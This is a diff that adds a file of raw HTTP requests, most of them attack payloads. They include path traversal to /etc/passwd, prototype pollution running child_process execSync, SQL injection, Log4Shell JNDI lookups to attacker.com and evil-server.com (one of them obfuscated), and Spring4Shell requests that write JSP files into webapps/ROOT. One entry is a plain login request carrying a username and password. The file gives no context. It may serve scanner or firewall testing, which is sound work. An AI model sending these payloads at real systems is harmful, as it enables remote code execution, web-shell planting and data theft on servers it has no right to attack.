@@ -1,0 +1,105 @@
+GET /download?file=../../../../etc/passwd HTTP/1.1
+Host: vulnerable-app.com
+User-Agent: Mozilla/5.0
+Accept: */*
+Connection: close
+
+---
+
+POST / HTTP/1.1
+Host: app.test
+User-Agent: Mozilla/5.0
+Content-Type: application/json
+Content-Length: 210
+
+{
+  "__proto__": {
+    "toString": "constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"echo 1337\").toString()')()"
+  }
+}
+
+---
+
+GET /user?id=1' OR '1'='1 HTTP/1.1
+Host: vulnerable-app.com
+User-Agent: Mozilla/5.0
+Accept: */*
+Connection: close
+ 
+---
+
+POST /login HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X)
+Content-Type: application/json
+Accept: application/json
+Connection: keep-alive
+Content-Length: 62
+
+{
+  "username": "furkan.sahin",
+  "password": "YeniSifre123"
+}
+ 
+---
+  
+GET /test HTTP/1.1
+Host: site.com
+User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
+Connection: keep-alive
+
+--- 
+ 
+GET /api/products HTTP/1.1
+Host: shop.com
+X-Api-Version: ${jndi:ldap://evil-server.com/Exploit}
+User-Agent: Mozilla/5.0
+Connection: close
+
+--- 
+ 
+GET / HTTP/1.1
+Host: vulnerable.com
+User-Agent: ${jndi:ldap://attacker.com/a}
+Accept: */*
+
+--- 
+ 
+POST /submit HTTP/1.1
+Host: app.com
+User-Agent: Mozilla/5.0
+Content-Type: application/json
+Content-Length: 80
+
+{
+  "name": "${jndi:ldap://attacker.com/Log4j}",
+  "comment": "test"
+}
+ 
+---
+  
+POST /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=hacked&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
+Host: test.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+
+c2=<% out.println("pwned"); %>
+ 
+---
+
+POST /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20%25%7Bc2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
+Host: vulnerable-app.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+
+c2=payload
+
+---
+
+POST /index?debug=true&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=diag_&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
+Host: app-env.internal
+User-Agent: curl/7.79.1
+Content-Type: application/x-www-form-urlencoded
+
+c2=<% out.println("diag:" + request.getRemoteAddr()); %>
